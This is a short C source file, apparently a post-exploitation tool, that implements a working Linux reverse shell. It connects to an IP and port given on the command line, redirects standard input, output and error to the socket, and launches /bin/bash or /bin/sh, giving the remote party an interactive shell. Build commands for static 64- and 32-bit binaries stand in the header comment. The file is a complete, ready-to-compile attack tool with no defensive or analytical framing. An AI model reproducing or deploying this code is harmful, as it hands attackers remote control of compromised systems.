/*
DESCRIPTION
Simple reverse shell for linux

COMPILATION
gcc -static -o rev simpleRevShell.c
gcc -static -m32 -o rev32 simpleRevShell.c

AUTHOR
DannyDB
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main(int argc, char *argv[]){

        if( argc != 3 ){
        	printf("\n [>] Usage: rev <ip> <port>\n");
        	return 1;
        }

        char *addr = strdup(argv[1]);
        int port = atoi(argv[2]);

        int sockt;
        char *terminal;
        struct sockaddr_in revsockaddr;

        sockt = socket(AF_INET, SOCK_STREAM,0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr(addr);

        if(connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
                printf("\n [!] ERROR: failed to connect\n");
                return 1;
        }
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        //Select terminal
        if(access("/bin/bash",F_OK)==0) {
        	terminal = "/bin/bash";
        }else{
        	terminal = "/bin/sh";
        }

        char * const arg[] = {terminal, NULL};
        execve(terminal, arg, NULL);

        return 0;

}





